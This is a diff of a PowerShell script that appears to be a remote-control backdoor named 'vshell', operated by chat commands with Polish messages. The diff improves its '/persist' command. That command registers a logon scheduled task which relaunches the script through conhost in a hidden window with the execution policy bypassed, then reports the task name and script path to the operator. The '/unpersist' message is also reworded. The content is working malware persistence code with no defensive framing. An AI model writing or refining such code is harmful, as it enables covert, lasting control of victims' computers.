@@ -152,11 +152,13 @@ function CommandListener
 
                 if ($text -match "^/persist") {
                     try {
-                        $action   = New-ScheduledTaskAction -Execute "conhost.exe" -Argument "-- powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script:ScriptPath`""
+                        if (-not $script:ScriptPath) { SendMessage "Blad: sciezka skryptu jest pusta (uruchom skrypt z pliku, nie z konsoli)." $text; continue }
+                        $conhost  = "$env:SystemRoot\System32\conhost.exe"
+                        $action   = New-ScheduledTaskAction -Execute $conhost -Argument "-- powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script:ScriptPath`""
                         $trigger  = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
                         $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0
-                        Register-ScheduledTask -TaskName "vshell_$session_id" -Action $action -Trigger $trigger -Settings $settings -RunLevel Limited -Force | Out-Null
-                        SendMessage "Persistence ustawiona. Task 'vshell_$session_id' uruchomi sie po kazdym logowaniu." $text
+                        $task     = Register-ScheduledTask -TaskName "vshell_$session_id" -Action $action -Trigger $trigger -Settings $settings -RunLevel Limited -Force
+                        SendMessage "Persistence ustawiona.`nTask: $($task.TaskName)`nSciezka: $script:ScriptPath" $text
                     } catch { SendMessage "Blad: $($Error[0])" $text }
                     continue
                 }
@@ -164,7 +166,7 @@ function CommandListener
                 if ($text -match "^/unpersist") {
                     try {
                         Unregister-ScheduledTask -TaskName "vshell_$session_id" -Confirm:$false
-                        SendMessage "Persistence usunieta. Task 'vshell_$session_id' zostal usuniety." $text
+                        SendMessage "Persistence usunieta. Task 'vshell_$session_id' usuniety z Task Schedulera." $text
                     } catch { SendMessage "Blad: $($Error[0])" $text }
                     continue
                 }
